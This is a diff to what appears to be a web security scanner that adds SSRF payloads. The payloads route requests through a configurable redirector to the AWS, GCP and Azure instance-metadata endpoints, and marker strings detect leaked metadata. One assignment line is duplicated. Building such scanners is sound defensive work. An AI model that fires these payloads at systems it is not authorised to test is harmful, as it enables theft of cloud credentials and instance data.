@@ -190,6 +190,9 @@ SSRF_BODY_MARKERS: dict[str, list[str]] = {
         "subscriptionId",
         "resourceGroupName",
     ],
+    "ssrf_redirect_aws": ["ami-id", "ami-launch-index", "instance-id", "placement/"],
+    "ssrf_redirect_gcp": ["project/project-id", "instance/zone"],
+    "ssrf_redirect_azure": ["vmId", "subscriptionId", "resourceGroupName"],
 }
 
 DEFAULT_USER_AGENT = (
@@ -507,6 +510,7 @@ class Scanner:
         auth_configured: bool = False,
         collaborator: object | None = None,
         ssrf_timeout: float = 10.0,
+        ssrf_redirector: str | None = None,
         json_template: dict | None = None,
         baseline_value: str = "",
         normalizer: BaselineNormalizer | None = None,
@@ -526,6 +530,8 @@ class Scanner:
         self.auth_configured = auth_configured
         self.collaborator = collaborator
         self.ssrf_timeout = ssrf_timeout
+        self.ssrf_redirector = ssrf_redirector
+        self.ssrf_redirector = ssrf_redirector
         self.json_template = json_template
         self.normalizer = normalizer if normalizer is not None else HTTPNormalizer()
         self.baseline_value = baseline_value
@@ -572,6 +578,14 @@ class Scanner:
             *DEFAULT_PAYLOADS,
             ("trustbound_marker", self._trustbound_nonce, "trustbound", "high"),
         ]
+        if ssrf_redirector:
+            _red = ssrf_redirector.rstrip("?&")
+            _sep = "&" if "?" in _red else "?"
+            self._payloads.extend([
+                ("ssrf_redirect_aws", f"{_red}{_sep}to=http://169.254.169.254/latest/meta-data/", "ssrf", "critical"),
+                ("ssrf_redirect_gcp", f"{_red}{_sep}to=http://metadata.google.internal/computeMetadata/v1/", "ssrf", "critical"),
+                ("ssrf_redirect_azure", f"{_red}{_sep}to=http://169.254.169.254/metadata/instance", "ssrf", "critical"),
+            ])
         if self.inject_in == "json-body":
             # json-body: filter to categories declared in the template's
             # _categories field. Default ["ssrf"] preserves backward
